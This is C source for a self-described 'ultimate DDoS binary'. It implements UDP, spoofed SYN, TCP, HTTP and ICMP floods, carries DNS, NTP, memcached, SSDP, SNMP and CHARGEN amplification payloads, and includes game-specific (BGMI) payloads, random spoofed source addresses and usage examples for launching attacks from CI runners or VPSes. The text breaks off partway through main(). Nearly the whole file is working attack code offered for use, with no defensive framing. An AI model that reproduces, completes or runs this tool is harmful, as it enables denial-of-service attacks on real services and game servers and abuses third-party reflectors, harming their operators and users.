/*
 * FINAL ULTIMATE DDoS BINARY – All Methods, All Payloads, All Optimizations
 * Compile: gcc -o Final new.c -lpthread -O3 -march=x86-64 -mtune=generic -flto -funroll-loops -D_GNU_SOURCE
 * Usage: ./ultimate <method> <ip> <port> <duration> <threads> [OPTIONS]
 *
 * Methods:
 *   udp       - UDP flood with sendmmsg (no root)
 *   syn       - Raw SYN spoof flood (REQUIRES ROOT)
 *   tcp       - TCP connect flood (no root)
 *   http      - HTTP GET/POST flood (no root)
 *   icmp      - ICMP echo flood (REQUIRES ROOT)
 *   dns       - DNS amplification (no root)
 *   ntp       - NTP amplification (no root)
 *   memcached - Memcached amplification (no root)
 *   ssdp      - SSDP reflection (no root)
 *   snmp      - SNMP reflection (no root)
 *   chargen   - CHARGEN reflection (no root)
 *   mixed     - UDP+TCP+HTTP (no root)
 *
 * Options:
 *   --max-pps        Optimize for maximum PPS (tiny payloads)
 *   --max-bandwidth  Optimize for maximum bandwidth (reflection payloads)
 *   --spoof          Enable IP spoofing (UDP/SYN)
 *   --random-ports   Randomize destination ports
 *   --random-delay   Add random delays
 *   --flood          Disable progress monitor
 *   --pps-limit <n>  Throttle to ~n packets/sec
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <errno.h>
#include <math.h>
#include <sys/resource.h>
#include <sys/mman.h>

// ==================== CONFIG ====================
#define MAX_THREADS 10000
#define SOCKET_BUFFER_SIZE (64 * 1024 * 1024)
#define MAX_MSG 512
#define THREAD_STACK_SIZE (512 * 1024)
#define MAXTTL 255
#define PHI 0x9e3779b9
#define MAX_SPOOF_IPS 65536

// ==================== GLOBAL STATE ====================
volatile int running = 1;
volatile unsigned long long total_sent = 0;
volatile unsigned long long total_bytes = 0;
int global_sock = -1;
struct sockaddr_in global_dest;

int optimize_for_pps = 0;
int optimize_for_bandwidth = 0;
int random_ports = 0;
int random_delay = 0;
int spoof_enabled = 0;
int flood_mode = 0;
int pps_limit = 0;
volatile unsigned int current_pps = 0;
volatile unsigned int throttle_sleep = 0;

// CMWC random generator
static unsigned long int Q[4096], c = 362436;
char *spoof_ips[MAX_SPOOF_IPS];
int spoof_count = 0;

void generate_spoof_ips() {
    spoof_count = MAX_SPOOF_IPS;
    unsigned int seed = time(NULL) ^ getpid();
    for (int i = 0; i < spoof_count; i++) {
        uint32_t ip;
        int range = i % 4;
        switch (range) {
            case 0: ip = (1 + (rand_r(&seed) % 9)) << 24; break;
            case 1: ip = (11 + (rand_r(&seed) % 116)) << 24; break;
            case 2: ip = (128 + (rand_r(&seed) % 44)) << 24; break;
            case 3: ip = (173 + (rand_r(&seed) % 51)) << 24; break;
        }
        ip |= (rand_r(&seed) % 256) << 16;
        ip |= (rand_r(&seed) % 256) << 8;
        ip |= (rand_r(&seed) % 256);
        spoof_ips[i] = strdup(inet_ntoa(*(struct in_addr*)&ip));
    }
}

// ==================== PAYLOADS (UDP) – ALL TYPES ====================
char *udp_payloads[] = {
    // Tiny packets for max PPS
    "\x01", "\x01\x00", "\x01\x00\x00\x00", "\x01\x00\x00\x00\x00\x00\x00\x00",
    "\x02\x00\x00\x00\x01\x00\x00\x00", "\x03\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",

    // DNS amplification
    "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01",
    "\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x02api\x06google\x03com\x00\x00\x01\x00\x01",

    // NTP amplification
    "\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",

    // Memcached amplification
    "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x67\x65\x74\x20\x73\x65\x74\x20\x73\x74\x61\x74\x73\x0d\x0a\x0d\x0a\x0d\x0a",

    // SSDP reflection
    "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n",

    // SNMP reflection
    "\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00",

    // CHARGEN reflection
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f",

    // Huge bandwidth payload (1400+ bytes)
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",

    // BGMI / Gaming payloads (from soul.c)
    "\x9d\x84\xaf\xc5\x40\xb4\xa7\xc2\x28\x71\xb0\x7d\x9d\x22",
    "\xb8\xb5\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
    "\x6c\x6f\x62\x62\x79\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
    "\x00\x01\x00\x01",
    "\x33\x66\x00\x0a\x00\x0a\x10\x01\x00\x00\x00\x00\x01\x00\x00\x00"
    "\x48\x00\x00\x00\x00\x02\x03\x00\x00\x27\x10\x00\x00\x00\x65\x00"
    "\x29\x03\x00\x00\x00\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39"
    "\x33\x38\x38\x37\x39\x31\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x03\x00\x00\x00\x00\x00",
    "\x4e\x05\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0c\x69\x6e\x2d"
    "\x63\x73\x6f\x76\x65\x72\x73\x65\x61\x05\x67\x6c\x6f\x62\x68\x03"
    "\x63\x6f\x6d\x00\x00\x01\x00\x01",
    "\x01\x00\x00\x00\x2a\x07\x00\x00\x00\x00\x11\x6c\xa4\x19\x00\x00"
    "\x09\xaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x69\xbc\x53\x92",
    "\x18\x11\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
    "\x76\x6f\x69\x63\x65\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
    "\x00\x01\x00\x01",
    "\x75\x75\x00\x69\x00\x01\x00\x00\x00\xde\x00\x00\x0f\xa1\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x14\x34\x37\x31\x35\x37\x33\x32\x33\x34"
    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x00\x00\x00\x00\x0a\x31"
    "\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00\x00\x69\xbc\x53"
    "\x98\x00\x00\x00\x21\x37\x61\x35\x64\x39\x63\x33\x39\x38\x64\x33"
    "\x36\x65\x31\x39\x35\x39\x37\x39\x39\x30\x34\x30\x30\x36\x34\x66"
    "\x32\x62\x62\x34\x39\x00",
    "\x28\x28\x70\x00\x2a\x08\x01\x10\x01\x18\xd3\xe8\xf8\xf2\xa1\xe9"
    "\xa7\xd7\xfd\x01\x20\xcb\x2e\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\xa1\x1f\x38\x00\x4c"
    "\xd8\xbb\xd3",
    "\x6f\x8d\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
    "\x76\x6f\x69\x63\x65\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
    "\x00\x1c\x00\x01",
    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
    "\x00\x69\xbc\x53\x9b\x00\x00\x00\x21\x36\x62\x64\x61\x30\x39\x66"
    "\x63\x32\x30\x65\x33\x31\x34\x36\x64\x66\x37\x36\x31\x65\x38\x30"
    "\x33\x37\x62\x34\x35\x64\x34\x39\x34\x00",
    "\x75\x75\x00\x7d\x00\x01\x00\x00\x00\xde\x00\x00\x13\x89\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x28\x34\x37\x31\x35\x37\x33\x32\x33\x34"
    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x5f\x31\x5f\x69\x6e\x5f"
    "\x67\x61\x6d\x65\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00"
    "\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x65\x38\x62\x30\x33\x38\x65"
    "\x30\x62\x63\x66\x34\x65\x38\x61\x38\x39\x38\x63\x66\x66\x64\x38"
    "\x63\x30\x39\x35\x62\x31\x31\x31\x66\x00",
    "\x28\x28\x7b\x00\x2a\x08\x01\x10\x01\x18\x87\xfe\x96\xee\xea\x99"
    "\xe1\xf5\xda\x01\x20\xfd\x3c\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\x89\x27\x38\x00\xec"
    "\x7b\xc7\xfc",
    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x63\x31\x30\x34\x37\x62\x66"
    "\x37\x34\x37\x32\x62\x30\x64\x32\x36\x35\x63\x37\x35\x66\x61\x61"
    "\x33\x33\x32\x30\x63\x62\x33\x62\x31\x00",
    "\x75\x75\x00\x7d\x00\x01\x00\x00\x00\x00\x00\x00\x13\x89\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x28\x34\x37\x31\x35\x37\x33\x32\x33\x34"
    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x5f\x31\x5f\x69\x6e\x5f"
    "\x67\x61\x6d\x65\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00"
    "\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x65\x38\x62\x30\x33\x38\x65"
    "\x30\x62\x63\x66\x34\x65\x38\x61\x38\x39\x38\x63\x66\x66\x64\x38"
    "\x63\x30\x39\x35\x62\x31\x31\x31\x66\x00",
    "\x28\x28\x7b\x00\x2a\x08\x01\x10\x01\x18\x87\xfe\x96\xee\x0a\x99"
    "\xe1\xf5\xda\x01\x20\xfd\x3c\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\x89\x27\x38\x00\xec"
    "\x7b\xc7\xfc",
    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x63\x31\x30\x34\x37\x62\x66"
    "\x37\x34\x37\x32\x62\x30\x64\x32\x36\x35\x63\x37\x35\x66\x61\x61"
    "\x33\x33\x32\x30\x63\x62\x33\x62\x31\x00",
};
int udp_payload_count = sizeof(udp_payloads) / sizeof(udp_payloads[0]);

// DNS amplification domains
const char* amplification_domains[] = {
    "isc.org", "ripe.net", "apnic.net", "arin.net", "lacnic.net", "afrinic.net",
    "google.com", "youtube.com", "facebook.com", "amazon.com", "microsoft.com",
    "apple.com", "netflix.com", "cloudflare.com", "akamai.com", "fastly.com",
    "cdn77.com", "stackpath.com", "keycdn.com", "bunny.net", "cloudfront.net",
    "azureedge.net", "googleapis.com", "aws.amazon.com", "oracle.com", "ibm.com",
    "salesforce.com", "adobe.com", "cisco.com", "intel.com", "qualcomm.com",
    "nvidia.com", "amd.com", "tsmc.com", "samsung.com", "sony.com", "panasonic.com",
    "siemens.com", "bosch.com", "ge.com", "hitachi.com", "toshiba.com", "fujitsu.com"
};
int amp_domain_count = sizeof(amplification_domains) / sizeof(amplification_domains[0]);

// HTTP
char *http_paths[] = {"/", "/api", "/login", "/wp-admin", "/.env", "/config"};
char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
};
int http_path_count = sizeof(http_paths) / sizeof(http_paths[0]);
int ua_count = sizeof(user_agents) / sizeof(user_agents[0]);

// ==================== UTILITIES ====================
unsigned short csum(unsigned short *buf, int count) {
    unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct {
        unsigned long saddr, daddr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudo = {iph->saddr, iph->daddr, 0, IPPROTO_TCP, htons(sizeof(struct tcphdr))};
    unsigned short *tcp = malloc(sizeof(pseudo) + sizeof(struct tcphdr));
    memcpy(tcp, &pseudo, sizeof(pseudo));
    memcpy((unsigned char *)tcp + sizeof(pseudo), tcph, sizeof(struct tcphdr));
    unsigned short out = csum(tcp, sizeof(pseudo) + sizeof(struct tcphdr));
    free(tcp);
    return out;
}

void init_rand(unsigned long int x) {
    Q[0] = x; Q[1] = x + PHI; Q[2] = x + PHI + PHI;
    for (int i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

unsigned long int rand_cmwc(void) {
    static unsigned long int i = 4095;
    unsigned long long int t, a = 18782LL;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) { x++; c++; }
    return (Q[i] = r - x);
}

void signal_handler(int sig) { running = 0; exit(0); }

int random_port() {
    int ports[] = {80, 443, 8080, 8443, 53, 123, 11211, 14000, 27015, 27016, 27017, 27018, 27019, 27020};
    return ports[rand() % 14];
}

// ==================== ATTACK THREADS ====================
void *udp_thread(void *arg) {
    int thread_id = (long)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) sock = global_sock;
    int buf_size = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    unsigned long long local_sent = 0, local_bytes = 0;
    int payload_lens[udp_payload_count];
    for (int i = 0; i < udp_payload_count; i++) payload_lens[i] = strlen(udp_payloads[i]);

    struct mmsghdr msgs[MAX_MSG];
    struct iovec iov[MAX_MSG];
    for (int i = 0; i < MAX_MSG; i++) {
        msgs[i].msg_hdr.msg_name = &global_dest;
        msgs[i].msg_hdr.msg_namelen = sizeof(global_dest);
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    while (running) {
        int batch = (rand() % 256) + 256;
        for (int i = 0; i < batch; i++) {
            int idx;
            if (optimize_for_pps && optimize_for_bandwidth)
                idx = (rand() % 10 < 7) ? (6 + (rand() % (udp_payload_count - 6))) : (rand() % 6);
            else if (optimize_for_pps)
                idx = rand() % 6;
            else if (optimize_for_bandwidth)
                idx = 6 + (rand() % (udp_payload_count - 6));
            else
                idx = rand() % udp_payload_count;
            int len = payload_lens[idx];
            iov[i].iov_base = udp_payloads[idx];
            iov[i].iov_len = len;
            local_bytes += len;
            if (random_ports) global_dest.sin_port = htons(random_port());
        }
        int sent = sendmmsg(sock, msgs, batch, 0);
        if (sent > 0) local_sent += sent;
        if (random_delay && (local_sent % 100 == 0)) usleep((rand() % 100) * 1000);
        pthread_yield();
    }
    __sync_fetch_and_add(&total_sent, local_sent);
    __sync_fetch_and_add(&total_bytes, local_bytes);
    if (sock != global_sock) close(sock);
    return NULL;
}

void *syn_thread(void *arg) {
    char *ip = (char*)arg;
    int port = *(int*)(ip + 64);
    int thread_id = *(int*)(ip + 128);
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return NULL;
    int opt = 1; setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    memset(packet, 0, sizeof(packet));
    iph->ihl = 5; iph->version = 4; iph->tot_len = sizeof(packet); iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP; iph->daddr = inet_addr(ip);
    tcph->dest = htons(port); tcph->doff = 5; tcph->syn = 1; tcph->window = htons(65535);
    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_port = htons(port), .sin_addr.s_addr = iph->daddr};
    unsigned long long local_sent = 0;

    while (running) {
        iph->saddr = inet_addr(spoof_ips[rand_cmwc() % spoof_count]);
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        iph->id = htons(rand_cmwc() & 0xFFFF); tcph->seq = rand_cmwc();
        iph->check = 0; iph->check = csum((unsigned short *)packet, iph->tot_len);
        tcph->check = 0; tcph->check = tcp_checksum(iph, tcph);
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
            local_sent++; __sync_fetch_and_add(&total_sent, 1); __sync_fetch_and_add(&total_bytes, sizeof(packet));
        }
        if ((local_sent & 0xFF) == 0) pthread_yield();
    }
    close(sock); return NULL;
}

void *tcp_thread(void *arg) {
    char *ip = (char*)arg; int port = *(int*)(ip + 64); int thread_id = *(int*)(ip + 128);
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_port = htons(port), .sin_addr.s_addr = inet_addr(ip)};
    unsigned long long local_sent = 0;
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0); if (sock < 0) continue;
        fcntl(sock, F_SETFL, O_NONBLOCK); connect(sock, (struct sockaddr*)&dest, sizeof(dest));
        send(sock, "GET / HTTP/1.1\r\n\r\n", 18, MSG_NOSIGNAL); close(sock);
        local_sent++; if ((local_sent & 0xFF) == 0) pthread_yield();
    }
    __sync_fetch_and_add(&total_sent, local_sent); return NULL;
}

void *http_thread(void *arg) {
    char *ip = (char*)arg; int port = *(int*)(ip + 64); int thread_id = *(int*)(ip + 128);
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_port = htons(port), .sin_addr.s_addr = inet_addr(ip)};
    unsigned long long local_sent = 0;
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0); if (sock < 0) continue;
        struct timeval tv = {1, 0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            char req[2048];
            snprintf(req, sizeof(req), "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n",
                     http_paths[rand() % http_path_count], ip, user_agents[rand() % ua_count]);
            send(sock, req, strlen(req), MSG_NOSIGNAL); local_sent++;
        }
        close(sock); if ((local_sent & 0x3F) == 0) pthread_yield();
    }
    __sync_fetch_and_add(&total_sent, local_sent); return NULL;
}

void *icmp_thread(void *arg) {
    char *ip = (char*)arg; int thread_id = *(int*)(arg + 128);
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); if (sock < 0) return NULL;
    int buf_size = SOCKET_BUFFER_SIZE; setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_addr.s_addr = inet_addr(ip)};
    char packet[64]; struct icmphdr *icmp = (struct icmphdr*)packet; memset(packet, 0, 64); icmp->type = ICMP_ECHO;
    unsigned long long local_sent = 0;
    while (running) {
        icmp->un.echo.id = rand(); icmp->un.echo.sequence = rand();
        icmp->checksum = 0; icmp->checksum = csum((unsigned short *)packet, sizeof(struct icmphdr));
        sendto(sock, packet, sizeof(struct icmphdr), 0, (struct sockaddr*)&dest, sizeof(dest));
        local_sent++; if ((local_sent & 0xFFF) == 0) pthread_yield();
    }
    close(sock); __sync_fetch_and_add(&total_sent, local_sent); return NULL;
}

void *dns_thread(void *arg) { return udp_thread(arg); }
void *ntp_thread(void *arg) { return udp_thread(arg); }
void *memcached_thread(void *arg) { return udp_thread(arg); }
void *ssdp_thread(void *arg) { return udp_thread(arg); }
void *snmp_thread(void *arg) { return udp_thread(arg); }
void *chargen_thread(void *arg) { return udp_thread(arg); }

void *mixed_thread(void *arg) {
    char *ip = (char*)arg; int port = *(int*)(ip + 64); int thread_id = *(int*)(ip + 128);
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    while (running) {
        int type = rand() % 3;
        if (type == 0) udp_thread(arg);
        else if (type == 1) tcp_thread(arg);
        else http_thread(arg);
    }
    return NULL;
}

// ==================== MAIN ====================
void banner() {
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║     🔥 FINAL ULTIMATE DDoS BINARY – ALL METHODS + BGMI 🔥        ║\n");
    printf("║   UDP | SYN | TCP | HTTP | ICMP | DNS | NTP | MEMCACHED | SSDP   ║\n");
    printf("║   SNMP | CHARGEN | MIXED                                          ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
}

void usage(char *prog) {
    banner();
    printf("\nUsage: %s <METHOD> <IP> <PORT> <TIME> <THREADS> [OPTIONS]\n\n", prog);
    printf("METHODS: udp, syn, tcp, http, icmp, dns, ntp, memcached, ssdp, snmp, chargen, mixed\n");
    printf("OPTIONS:\n");
    printf("  --max-pps        Optimize for maximum PPS (tiny UDP payloads)\n");
    printf("  --max-bandwidth  Optimize for maximum bandwidth (reflection payloads)\n");
    printf("  --spoof          Enable IP spoofing (UDP/SYN)\n");
    printf("  --random-ports   Randomize destination ports\n");
    printf("  --random-delay   Add random delays\n");
    printf("  --flood          Disable progress monitor\n");
    printf("  --pps-limit <n>  Throttle to ~n packets/sec\n\n");
    printf("EXAMPLES:\n");
    printf("  # GitHub Actions / non‑root VPS (max bandwidth)\n");
    printf("  %s udp 1.1.1.1 443 60 2000 --max-bandwidth --flood\n", prog);
    printf("  # Root VPS (raw SYN spoof)\n");
    printf("  sudo %s syn 1.1.1.1 80 60 2000\n", prog);
    printf("  # Non‑root VPS (mixed flood)\n");
    printf("  %s mixed 1.1.1.1 80 120 3000 --random-ports\n", prog);
    exit(1);
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler); signal(SIGTERM, signal_handler);
    init_rand(time(NULL) ^ getpid());
    generate_spoof_ips();

    if (argc < 6) usage(argv[0]);

    char *method = argv[1], *ip = argv[2];
    int port = atoi(argv[3]), duration = atoi(argv[4]), threads = atoi(argv[5]);

    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--max-pps") == 0) optimize_for_pps = 1;
        else if (strcmp(argv[i], "--max-bandwidth") == 0) optimize_for_bandwidth = 1;
        else if (strcmp(argv[i], "--spoof") == 0) spoof_enabled = 1;
        else if (strcmp(argv[i], "--random-ports") == 0) random_ports = 1;
        else if (strcmp(argv[i], "--random-delay") == 0) random_delay = 1;
        else if (strcmp(argv[i], "--flood") == 0) flood_mode = 1;
        else if (strcmp(argv[i], "--pps-limit") == 0 && i + 1 < argc) pps_limit = atoi(argv[++i]);
    }

    if (duration <= 0 || duration > 600) duration = 60;
    if (threads < 1 || threads > MAX_THREADS) threads = 2000;

    banner();
    printf("\n[CONFIG] Method: %s | Target: %s:%d | Duration: %ds | Threads: %d\n", method, ip, port, duration, threads);
    if (optimize_for_pps) printf("[MODE] MAX PPS\n");
    else if (optimize_for_bandwidth) printf("[MODE] MAX BANDWIDTH\n");
    if (pps_limit) printf("[LIMIT] %d pps\n", pps_limit);
    printf("\n🔥 ATTACK STARTING...\n\n");

    // Setup UDP socket if needed
    if (strcmp(method, "udp") == 0 || strcmp(method, "dns") == 0 || strcmp(method, "ntp") == 0 ||
        strcmp(method, "memcached") == 0 || strcmp(method, "ssdp") == 0 || strcmp(method, "snmp") == 0 ||
        strcmp(method, "chargen") == 0 || strcmp(method, "mixed") == 0) {
        global_sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (global_sock < 0) { perror("UDP socket"); exit(1); }
        int opt = 1, buf_size = SOCKET_BUFFER_SIZE;
        setsockopt(global_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(global_sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        memset(&global_dest, 0, sizeof(global_dest));
        global_dest.sin_family = AF_INET; global_dest.sin_port = htons(port);
